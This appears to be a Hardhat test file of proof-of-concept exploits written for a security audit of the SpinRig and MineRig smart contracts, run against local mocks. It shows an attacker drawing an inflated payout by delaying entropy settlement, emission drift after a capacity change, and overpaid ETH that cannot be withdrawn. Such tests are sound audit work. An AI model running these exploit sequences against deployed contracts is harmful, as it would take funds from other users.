const path = require("path");
module.paths.push(path.resolve(__dirname, "../../../packages/hardhat/node_modules"));

const { expect } = require("chai");
const { ethers, network } = require("hardhat");

const toUnits = (value, decimals = 18) => ethers.utils.parseUnits(value.toString(), decimals);

async function increaseTime(seconds) {
  await ethers.provider.send("evm_increaseTime", [seconds]);
  await ethers.provider.send("evm_mine", []);
}

async function latestTimestamp() {
  const block = await ethers.provider.getBlock("latest");
  return block.timestamp;
}

async function futureDeadline() {
  return (await latestTimestamp()) + 3600;
}

describe("Codex 5.3 PoCs - High Impact Findings", function () {
  let owner;
  let protocol;
  let launcher;
  let attacker;
  let user1;
  let user2;

  let weth;
  let usdc;
  let entropy;
  let registry;
  let uniFactory;
  let uniRouter;
  let unitFactory;
  let mineRigFactory;
  let spinRigFactory;
  let auctionFactory;
  let mineCore;
  let spinCore;

  beforeEach(async function () {
    await network.provider.send("hardhat_reset");
    [owner, protocol, launcher, attacker, user1, user2] = await ethers.getSigners();

    const MockWETH = await ethers.getContractFactory("MockWETH");
    weth = await MockWETH.deploy();

    const MockUSDC = await ethers.getContractFactory("MockUSDC");
    usdc = await MockUSDC.deploy();

    const MockEntropy = await ethers.getContractFactory("MockEntropy");
    entropy = await MockEntropy.deploy();

    const MockUniswapV2Factory = await ethers.getContractFactory("MockUniswapV2Factory");
    uniFactory = await MockUniswapV2Factory.deploy();

    const MockUniswapV2Router = await ethers.getContractFactory("MockUniswapV2Router");
    uniRouter = await MockUniswapV2Router.deploy(uniFactory.address);

    const Registry = await ethers.getContractFactory("Registry");
    registry = await Registry.deploy();

    const UnitFactory = await ethers.getContractFactory("UnitFactory");
    unitFactory = await UnitFactory.deploy();

    const MineRigFactory = await ethers.getContractFactory("MineRigFactory");
    mineRigFactory = await MineRigFactory.deploy();

    const SpinRigFactory = await ethers.getContractFactory("SpinRigFactory");
    spinRigFactory = await SpinRigFactory.deploy();

    const AuctionFactory = await ethers.getContractFactory("AuctionFactory");
    auctionFactory = await AuctionFactory.deploy();

    const MineCore = await ethers.getContractFactory("MineCore");
    mineCore = await MineCore.deploy(
      registry.address,
      usdc.address,
      uniFactory.address,
      uniRouter.address,
      unitFactory.address,
      mineRigFactory.address,
      auctionFactory.address,
      entropy.address,
      protocol.address,
      toUnits("100", 6)
    );

    const SpinCore = await ethers.getContractFactory("SpinCore");
    spinCore = await SpinCore.deploy(
      registry.address,
      usdc.address,
      uniFactory.address,
      uniRouter.address,
      unitFactory.address,
      spinRigFactory.address,
      auctionFactory.address,
      entropy.address,
      protocol.address,
      toUnits("100", 6)
    );

    await registry.connect(owner).setFactoryApproval(mineCore.address, true);
    await registry.connect(owner).setFactoryApproval(spinCore.address, true);

    for (const signer of [launcher, attacker, user1, user2]) {
      await weth.connect(signer).deposit({ value: toUnits("500", 18) });
      await usdc.connect(owner).mint(signer.address, toUnits("50000", 6));
    }
  });

  async function launchSpinRig(overrides = {}) {
    const defaults = {
      launcher: launcher.address,
      quoteToken: weth.address,
      tokenName: "Spin Unit",
      tokenSymbol: "SPIN",
      uri: "ipfs://spin",
      usdcAmount: toUnits("200", 6),
      unitAmount: toUnits("1000000", 18),
      initialUps: toUnits("4", 18),
      tailUps: toUnits("0.01", 18),
      halvingPeriod: 7 * 24 * 60 * 60,
      rigEpochPeriod: 60 * 60,
      rigPriceMultiplier: toUnits("2", 18),
      rigMinInitPrice: toUnits("0.0001", 18),
      odds: [8000],
      auctionInitPrice: toUnits("1", 18),
      auctionEpochPeriod: 60 * 60,
      auctionPriceMultiplier: toUnits("2", 18),
      auctionMinInitPrice: toUnits("0.1", 18),
    };

    const params = { ...defaults, ...overrides };
    await usdc.connect(launcher).approve(spinCore.address, params.usdcAmount);

    const tx = await spinCore.connect(launcher).launch(params);
    const receipt = await tx.wait();
    const launchEvent = receipt.events.find((event) => event.event === "SpinCore__Launched");

    const rig = await ethers.getContractAt("SpinRig", launchEvent.args.rig);
    const unit = await ethers.getContractAt("Unit", launchEvent.args.unit);
    return { rig, unit };
  }

  async function launchMineRig(overrides = {}) {
    const defaults = {
      launcher: launcher.address,
      quoteToken: weth.address,
      tokenName: "Mine Unit",
      tokenSymbol: "MINE",
      uri: "ipfs://mine",
      usdcAmount: toUnits("200", 6),
      unitAmount: toUnits("1000000", 18),
      initialUps: toUnits("4", 18),
      tailUps: toUnits("0.01", 18),
      halvingAmount: toUnits("10000000", 18),
      rigEpochPeriod: 60 * 60,
      rigPriceMultiplier: toUnits("2", 18),
      rigMinInitPrice: toUnits("0.0001", 18),
      upsMultipliers: [toUnits("1", 18)],
      upsMultiplierDuration: 24 * 60 * 60,
      auctionInitPrice: toUnits("1", 18),
      auctionEpochPeriod: 60 * 60,
      auctionPriceMultiplier: toUnits("2", 18),
      auctionMinInitPrice: toUnits("0.1", 18),
    };

    const params = { ...defaults, ...overrides };
    await usdc.connect(launcher).approve(mineCore.address, params.usdcAmount);

    const tx = await mineCore.connect(launcher).launch(params);
    const receipt = await tx.wait();
    const launchEvent = receipt.events.find((event) => event.event === "MineCore__Launched");

    const rig = await ethers.getContractAt("MineRig", launchEvent.args.rig);
    const unit = await ethers.getContractAt("Unit", launchEvent.args.unit);
    return { rig, unit };
  }

  it("POC-H-01: SpinRig callback payout is based on callback-time pool, enabling delayed-settlement extraction", async function () {
    const { rig, unit } = await launchSpinRig();

    const entropyFee = await rig.getEntropyFee();

    const epoch0 = await rig.getEpochId();
    const price0 = await rig.getPrice();
    await weth.connect(attacker).approve(rig.address, price0.add(toUnits("10", 18)));

    const tx0 = await rig
      .connect(attacker)
      .spin(attacker.address, epoch0, await futureDeadline(), price0.add(toUnits("10", 18)), { value: entropyFee });
    const receipt0 = await tx0.wait();
    const req0 = receipt0.events.find((event) => event.event === "SpinRig__EntropyRequested");
    const attackerSequence = req0.args.sequenceNumber;

    const poolAtSpinTime = await rig.getPrizePool();

    await increaseTime(3 * 24 * 60 * 60);

    const epoch1 = await rig.getEpochId();
    const price1 = await rig.getPrice();
    await weth.connect(user1).approve(rig.address, price1.add(toUnits("10", 18)));
    await rig
      .connect(user1)
      .spin(user1.address, epoch1, await futureDeadline(), price1.add(toUnits("10", 18)), { value: entropyFee });

    const poolBeforeCallback = await rig.getPrizePool();
    expect(poolBeforeCallback).to.be.gt(poolAtSpinTime);

    const expectedUsingOldPool = poolAtSpinTime.mul(8000).div(10000);
    const attackerUnitBefore = await unit.balanceOf(attacker.address);

    await entropy.connect(owner).fulfillEntropy(attackerSequence, ethers.utils.hexZeroPad("0x42", 32));

    const attackerUnitAfter = await unit.balanceOf(attacker.address);
    const actualPayout = attackerUnitAfter.sub(attackerUnitBefore);

    // With odds=[8000], payout is deterministic: 80% of pool at callback time.
    const expectedUsingCallbackPool = poolBeforeCallback.mul(8000).div(10000);
    expect(actualPayout).to.equal(expectedUsingCallbackPool);
    expect(actualPayout).to.be.gt(expectedUsingOldPool);
  });

  it("POC-H-02: setCapacity keeps legacy slots overpowered, causing emission-rate drift", async function () {
    const { rig, unit } = await launchMineRig();

    await rig.connect(launcher).setEntropyEnabled(false);

    const slot0Initial = await rig.getSlot(0);
    await rig
      .connect(attacker)
      .mine(attacker.address, 0, slot0Initial.epochId, await futureDeadline(), toUnits("1000", 18), "slot0");

    const slot0AfterFirstMine = await rig.getSlot(0);
    const highUps = slot0AfterFirstMine.ups;
    expect(highUps).to.be.gt(0);

    await rig.connect(launcher).setCapacity(2);
    const slot0AfterCapacityChange = await rig.getSlot(0);
    expect(slot0AfterCapacityChange.ups).to.equal(highUps);

    const slot1Initial = await rig.getSlot(1);
    await rig
      .connect(user1)
      .mine(user1.address, 1, slot1Initial.epochId, await futureDeadline(), toUnits("1000", 18), "slot1");

    const slot1AfterMine = await rig.getSlot(1);
    const lowUps = slot1AfterMine.ups;
    expect(highUps).to.be.gt(lowUps);

    await increaseTime(2 * 24 * 60 * 60);

    const slot0BeforeDisplacement = await rig.getSlot(0);
    const currentTs = await latestTimestamp();
    const elapsed = ethers.BigNumber.from(currentTs).sub(slot0BeforeDisplacement.startTime);
    const expectedIfRebalanced = elapsed.mul(lowUps).mul(slot0BeforeDisplacement.upsMultiplier).div(toUnits("1", 18));

    const attackerBefore = await unit.balanceOf(attacker.address);
    await rig
      .connect(user2)
      .mine(user2.address, 0, slot0BeforeDisplacement.epochId, await futureDeadline(), toUnits("1000", 18), "takeover");
    const attackerAfter = await unit.balanceOf(attacker.address);

    const actualMinted = attackerAfter.sub(attackerBefore);
    expect(actualMinted).to.be.gt(expectedIfRebalanced);
  });

  it("POC-M-01: SpinRig keeps excess ETH with no withdrawal path when entropy fee is overpaid", async function () {
    const { rig } = await launchSpinRig();

    const epoch = await rig.getEpochId();
    const price = await rig.getPrice();
    const entropyFee = await rig.getEntropyFee();
    const overpayment = entropyFee.mul(2);

    await weth.connect(attacker).approve(rig.address, price.add(toUnits("10", 18)));

    const balanceBefore = await ethers.provider.getBalance(rig.address);
    await rig.connect(attacker).spin(
      attacker.address,
      epoch,
      await futureDeadline(),
      price.add(toUnits("10", 18)),
      { value: overpayment }
    );
    const balanceAfter = await ethers.provider.getBalance(rig.address);

    // One entropy fee is forwarded to Entropy, the rest is retained by SpinRig.
    expect(balanceAfter.sub(balanceBefore)).to.equal(entropyFee);
  });
});
